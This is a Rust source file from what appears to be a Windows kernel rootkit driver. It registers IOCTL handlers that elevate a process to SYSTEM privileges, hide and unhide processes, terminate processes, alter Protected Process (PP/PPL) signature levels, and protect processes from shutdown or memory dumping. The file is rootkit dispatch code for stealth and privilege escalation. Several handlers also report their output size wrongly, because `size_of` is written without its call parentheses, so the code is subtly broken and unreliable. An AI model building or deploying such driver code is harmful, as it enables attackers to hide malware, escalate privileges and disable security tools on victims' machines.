use {
    core::mem::size_of,
    alloc::boxed::Box,
    hashbrown::HashMap,
    shared::{
        ioctls::*, 
        structs::{
            EnumerateInfoInput, ProcessInfoHide, ProcessListInfo, ProcessSignature, TargetProcess
        }
    },
    wdk_sys::{IO_STACK_LOCATION, IRP},
    crate::{handle_process, process::Process, utils::ioctls::IoctlHandler},
};

#[cfg(not(feature = "mapper"))]
use {
    crate::process::add_remove_process_toggle,
    shared::structs::ProcessProtection,
};

pub fn get_process_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {

    // Elevates the specified process to system privileges.
    ioctls.insert(IOCTL_ELEVATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_ELEVATE_PROCESS");
        let status = unsafe { handle_process!(stack, Process::elevate_process, TargetProcess) };
        unsafe { (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64; }
        status
    }) as IoctlHandler);

    // Hide / Unhide the specified process.
    ioctls.insert(IOCTL_HIDE_UNHIDE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_HIDE_UNHIDE_PROCESS");
        let status = unsafe { handle_process!(stack, Process::process_toggle, ProcessInfoHide) };
        unsafe { (*irp).IoStatus.Information = size_of::<ProcessInfoHide>() as u64; }
        status
    }) as IoctlHandler);

    // Terminate process.
    ioctls.insert(IOCTL_TERMINATE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_TERMINATE_PROCESS");
        let status = unsafe { handle_process!(stack, Process::terminate_process, TargetProcess) };
        unsafe { (*irp).IoStatus.Information = size_of::<TargetProcess> as u64 };
        status
    }) as IoctlHandler);

    // Modifying the PP / PPL of a process.
    ioctls.insert(IOCTL_SIGNATURE_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_SIGNATURE_PROCESS");
        let status = unsafe { handle_process!(stack, Process::protection_signature, ProcessSignature) };
        unsafe { (*irp).IoStatus.Information = size_of::<ProcessSignature> as u64 };
        status
    }) as IoctlHandler);

    // Lists the processes currently hidden and protect.
    ioctls.insert(IOCTL_ENUMERATION_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_ENUMERATION_PROCESS");
        let mut information = 0;
        let status = unsafe { handle_process!(irp, stack, Process::enumerate_process_toggle, EnumerateInfoInput, ProcessListInfo, &mut information) };
        unsafe { (*irp).IoStatus.Information = information as u64 };
        status
    }) as IoctlHandler);

    // If the feature is a mapper, these functionalities will not be added.
    #[cfg(not(feature = "mapper"))] {

        // Responsible for adding shutdown protection / memory dumping for a process.
        ioctls.insert(IOCTL_PROTECTION_PROCESS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            log::info!("Received IOCTL_PROTECTION_PROCESS");
            let status = unsafe { handle_process!(stack, add_remove_process_toggle, ProcessProtection) };
            unsafe { (*irp).IoStatus.Information = size_of::<ProcessProtection> as u64 };
            status
        }) as IoctlHandler);
    }

}
 